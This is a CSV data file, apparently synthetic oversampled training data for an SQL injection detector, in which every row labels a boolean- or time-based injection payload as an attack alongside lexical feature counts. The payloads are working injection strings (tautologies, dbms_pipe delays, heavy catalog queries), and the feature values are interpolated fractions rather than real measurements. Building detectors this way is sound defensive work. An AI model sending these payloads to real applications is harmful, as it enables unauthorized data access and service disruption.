id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000130,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,2.474397045505156,104.0649853382493,28.46233431078338,3.9307461533428305,54.04429325788141,7.6233431078338025,30.397348972534083,12.0,0.5077113947008857,0.07713927636587876,0.2992315196294622,0.11591780930377332,2.0753313784332397,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.311671553916901,0.0,0.4623343107833803,1.5376656892166196,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000131,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,2.1380056019831457,89.14656823616585,23.23562117588943,3.2605809657380354,19.85343176383415,13.0,42.29313647233171,14.0,0.22302997780443581,0.14586596065557492,0.47401764237244703,0.1570864191675422,2.4712423517788626,1.5287576482211376,0.0,0.0,0.3821894120552844,1.6178105879447156,0.0,6.764378824110569,0.0,0.6178105879447157,0.6178105879447158,2.0,0.6178105879447156,0.38218941205528434,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,2.6025062754664914,134.34357016183804,29.79565924321831,4.1905380719574055,80.18263697287324,6.591318486436622,33.175402378237095,14.39421232429108,0.6031947196501354,0.046763101592129194,0.24279684986558814,0.10724532889214736,1.8028938378544597,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,3.7956592432183105,0.0,0.0,2.59855308107277,2.0,1.0,0.0,0.0,0.5985530810727703,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,0.7817176535221192,95.55597382203078,23.06845650423669,2.961615864135844,10.884832561439062,15.893154349576331,50.13691300847338,18.64107390254201,0.10572669326707895,0.17006950784893404,0.5275145091788049,0.1966892897051821,3.786308699152662,0.427382601694676,0.8931543495763311,0.10684565042366899,0.0,2.0,0.0,8.427382601694676,2.0,0.0,1.0,3.0,1.0,0.106845650423669,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1068456504236688,0.893154349576331,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,2.61152003018541,142.0,31.075475676784155,3.8876500422132283,44.235835131255456,20.301902707136623,52.0,25.46226216160792,0.3115199657130666,0.14297114582490578,0.36619718309859156,0.17931170536343607,0.0,2.3867864848237668,1.0754756767841556,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,9.075475676784155,0.0,1.0,0.5377378383920777,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.5377378383920779,0.0,0.9245243232158443,0.5377378383920778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.274909979457968,136.00345966146108,33.0,4.226165727680116,71.0,9.0,37.83621638455089,18.167243276910177,0.5223358208131148,0.06621158291997231,0.2778917210602323,0.1335608752066805,0.08362163845508874,0.9163783615449113,2.0,0.0,1.0,1.0,0.0,5.1672432769101775,1.0,0.0,3.0,4.0,0.08362163845508869,0.9163783615449111,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.41487057870378063,141.2517616147747,32.125880807387354,4.144444202313599,69.12588080738735,16.0,41.0,15.125880807387354,0.4893804316035393,0.11327539622891458,0.2902682028365936,0.10707596933095256,0.0,0.12588080738735352,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.12588080738735347,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.1258808073873534,0.8741191926126465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000137,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000009,3.6304301422410568,73.48491048539827,24.5452685438052,3.724970136928351,17.394373397787863,18.66598466061907,25.939641941593067,11.484910485398267,0.2363940228143166,0.2545314751158152,0.3528241410749232,0.15625036099494494,1.9396419415930644,0.5150895146017338,1.5452685438052014,0.0,0.0,2.0,0.0,3.484910485398266,0.0,1.0,1.0,3.5452685438052014,0.48491048539826614,0.5150895146017338,0.5150895146017338,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5150895146017338,0.0,0.9698209707965325,0.5150895146017339,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,1.0345380796397738,143.77631746310252,30.521255189469425,4.185472112614421,83.0850207578777,8.04251037893885,37.28711274032674,15.361673585959233,0.5811871549139904,0.05473812010047476,0.25717803078227686,0.10689669420325794,1.3191632070203834,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.521255189469425,0.0,0.0,2.8404183964898087,2.0,1.0,0.0,0.0,0.8404183964898083,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000139,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,0.37277535064284134,147.7574190011551,30.827493769319624,4.183334018813332,84.3099750772785,8.65498753863925,39.022464692811205,15.769991692426167,0.5718988376272426,0.05810398557270218,0.26324762425678533,0.10674955254326986,1.1150041537869166,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.827493769319625,0.0,0.0,2.942497923106542,2.0,1.0,0.0,0.0,0.9424979231065416,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,0.6397919851407178,111.53344783169648,29.943205635863094,3.4855865631527188,32.56794364136906,13.0,49.965504190327415,16.0,0.2917985049725488,0.11685900319760754,0.4475160263558652,0.1438264654739785,1.1703830924107197,1.1102230246251565e-16,1.8864112717261867,0.0,0.9432056358630934,1.0567943641369066,0.0,9.056794364136906,0.0,0.9432056358630936,0.9432056358630935,3.886411271726187,1.0,0.0,0.9432056358630934,0.0,0.0,1.0,1.0,0.0,0.0,0.05679436413690651,0.0,1.0,0.0,0.0,0.9432056358630934,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05679436413690651,0.05679436413690651,3.0567943641369064
SMOTE_000141,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,1.5106356101226066,86.7784383461657,22.2483271561079,3.1954670017786726,18.744981468323704,13.0,41.530111190057795,13.503345687784199,0.21915376052665195,0.15100687577960292,0.47392811915230726,0.15591124454143784,0.9933086244316014,3.0066913755683986,0.0,0.0,0.7516728438920997,1.2483271561079003,0.0,7.006691375568399,0.0,0.24832715610790035,0.24832715610790035,2.0,0.2483271561079003,0.7516728438920997,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000015,1.7204544463973226,116.77944105704438,29.036402184982766,3.498574702804576,31.072804369965535,14.438972052852218,51.51177642281775,19.755888211408877,0.26367529495374953,0.1257543329997708,0.44228148818591856,0.16828888386056107,5.438972052852218,1.1102230246251565e-16,0.0,0.7194860264261096,0.0,2.0,0.0,8.877944105704438,1.4389720528522192,0.2805139735738904,1.0,2.7194860264261096,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,1.9272469287054488,163.24396726953682,37.17068848697546,4.011493479702026,53.65862302604908,21.548704852207056,58.24396726953681,29.792672121743866,0.32848363580996603,0.13228538135134466,0.3566511082929661,0.18257987454572316,2.3780163652315958,0.621983634768404,1.5853442434877305,0.0,0.0,1.7926721217438653,0.0,11.621983634768405,0.20732787825613472,2.0,1.6219836347684042,10.548704852207058,0.7926721217438653,0.20732787825613486,0.7926721217438653,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.7926721217438651,0.0,0.7926721217438653,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.621983634768404,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2073278782561347
SMOTE_000144,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.00033904863516021777,135.0023606804976,33.00008140277578,4.239269747408999,71.00089543053357,9.000569819430453,37.00097683330935,17.99991859722422,0.5259238154835909,0.06666918154917041,0.2740760852447313,0.13333091772250738,0.0,1.0,2.0,0.0,1.0,1.0000814027757792,0.0,5.000081402775779,0.9999185972242209,0.0,2.9999185972242213,4.000081402775779,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,8.14027757790603e-05,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.000081402775779
SMOTE_000145,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,0.5245268986708856,153.06565600291424,33.844276000485706,3.862413752335668,57.59848400437136,11.090067996600053,58.45496600169997,25.922138000242853,0.3757679180766988,0.0730388655317023,0.38179948143816794,0.169393734953431,0.0,2.8442760004857064,0.15572399951429328,0.0,0.0,1.0778619997571468,0.0,11.844276000485706,0.0,2.0,1.0,7.23358599927144,0.0,1.0,0.07786199975714664,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.9221380002428534,0.0,0.0778619997571467,0.9221380002428533,0.9221380002428533,0.0778619997571467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.922138000242853
SMOTE_000146,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.19864594821357334,141.1205470507139,32.06027352535694,4.141064214895951,69.06027352535695,16.0,41.0,15.060273525356944,0.48937067006775137,0.11337951927731874,0.29053501814812926,0.1067147925068006,0.0,0.06027352535694297,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.06027352535694297,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.06027352535694308,0.9397264746430569,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000147,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,1.8315539282400581,83.8411151724448,18.420557586222404,2.6634848091416625,14.420557586222404,9.676232044349375,46.0,13.744325541873028,0.16346252699149347,0.10633222026757555,0.5629354093960472,0.1672698433448837,0.0,4.0,0.0,0.0,0.7443255418730288,1.0,0.0,8.0,0.0,0.0,0.0,1.7443255418730286,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.488651083746058,0.2556744581269712,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7443255418730292
SMOTE_000148,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.7138754650036512,82.1799038659353,23.584278847566807,3.4889213539937955,21.0,13.0,35.01134617080169,13.168557695133615,0.2574051011694347,0.15934601500965007,0.42288118986381085,0.1603676939571044,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.1685576951336145,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000149,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,3.138187191794643,118.10477172934601,26.251728898720945,3.5003780725751206,33.94398337020354,14.594398337020355,49.18879667404071,20.377593348081415,0.2723275495712965,0.12681691813862822,0.43146269910136104,0.16939283318871418,0.0,4.0,0.0,0.0,0.46853388765988196,1.531466112340118,0.0,9.062932224680235,0.0,1.062932224680236,0.531466112340118,5.188796674040708,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5314661123401179,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,3.7541325332872804,104.65100896595655,25.699082547546585,3.372393520351972,28.13614669969566,13.0,48.835229247242246,14.679633019018635,0.2617211115866067,0.12977246876597254,0.4637906283277253,0.14471579131969545,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,7.359266038037269,0.0,0.6601834904906828,0.6601834904906829,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.3398165095093172,0.0,0.33981650950931724,0.0,0.0,0.0,1.6601834904906827,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3398165095093172,0.3398165095093172,2.6796330190186346
SMOTE_000151,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,0.18428464535950925,110.85668975488593,30.222104751266723,3.510209900591455,32.475938752714406,13.253834001447684,49.03172925018096,16.09518775054288,0.2925639807990866,0.11929560539785854,0.4429006250517913,0.14523978875126356,1.0951877505428813,1.1102230246251565e-16,1.936541499638079,0.0,1.0,1.0317292501809605,0.0,8.96827074981904,0.0,1.0,1.0,4.031729250180961,1.0,0.0,0.9682707498190395,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0317292501809605,0.0,0.03172925018096051,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.063458500361921
SMOTE_000152,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.24375774412849147,80.82691647859593,22.971152746432654,3.2850495699974998,17.971152746432658,13.028847253567344,37.76922197146124,12.057694507134688,0.22235043223807707,0.1612488416983058,0.4671414244447268,0.1492593016188903,0.0,3.884610985730622,0.0,0.0,0.9711527464326555,1.0,0.0,5.971152746432655,0.0,0.028847253567344633,0.11538901426937831,1.9711527464326557,0.0,0.9711527464326554,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9711527464326557,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.028847253567344508,0.028847253567344414,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0288472535673447
SMOTE_000153,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.0546402691287822,144.60646342577013,32.7824057659791,4.116997859814423,70.5648115319582,10.523159638146282,44.82405765979102,18.694434595874615,0.48829373709324614,0.07350171548497261,0.3093553768996641,0.12884917052211714,0.7824057659791025,1.1102230246251565e-16,2.0,0.0,1.0,1.2175942340208974,0.0,6.347217297937307,0.7824057659791025,0.0,2.782405765979102,4.217594234020898,0.7824057659791025,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.21759423402089753,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2175942340208974
SMOTE_000154,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,2.944058682638405,136.37929086532583,31.62070913467416,4.144668927152032,72.83905448710112,8.540236378224721,37.0,18.0,0.5339958510102263,0.06266872212949032,0.2713347417060088,0.13200068515427454,1.839054487101117,0.5402363782247208,1.0804727564494414,0.0,1.0,1.4597636217752792,0.0,4.540236378224721,1.4597636217752794,0.0,2.540236378224721,3.540236378224721,0.45976362177527924,0.5402363782247207,0.5402363782247208,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9195272435505584,0.5402363782247208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4597636217752794
SMOTE_000155,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,1.7073716976643707,142.0,31.39556019290843,3.8853487653036196,43.115539324820496,21.58224077163372,52.0,25.302219903545787,0.3036305586254964,0.1519876110678431,0.36619718309859156,0.1781846472080689,0.0,1.9066597106373546,1.3955601929084303,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,9.39556019290843,0.0,1.0,0.6977800964542151,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.6977800964542151,0.0,0.6044398070915697,0.6977800964542151,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,1.711818791919093,164.62881585390411,34.0,3.8786260440044003,59.75920113242172,14.555206794530337,62.03680452968689,28.277603397265167,0.36339737318385135,0.08794115985693532,0.37695453626281067,0.17170693069640264,0.0,3.0,0.0,0.0,0.0,1.0,0.0,13.518402264843445,0.7592011324217227,2.0,3.2776033972651684,5.481597735156555,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.2407988675782773,0.0,0.0,0.2407988675782773,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2776033972651684,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.759201132421723
SMOTE_000157,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,2.216317037594468,115.312049282555,29.803257433979446,3.4638845495167856,33.96742566020555,13.0,52.34462362234944,16.0,0.2939901291029098,0.11359942663084174,0.45259576533598167,0.13981467893026675,1.590227698061665,1.1102230246251565e-16,1.6065148679588896,0.0,0.8032574339794449,1.196742566020555,0.0,9.196742566020555,0.0,0.8032574339794449,0.8032574339794449,3.60651486795889,1.0,0.0,0.8032574339794449,0.0,0.0,1.0,1.0,0.0,0.0,0.19674256602055504,0.0,1.0,0.0,0.0,0.8032574339794449,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19674256602055504,0.19674256602055504,3.1967425660205553
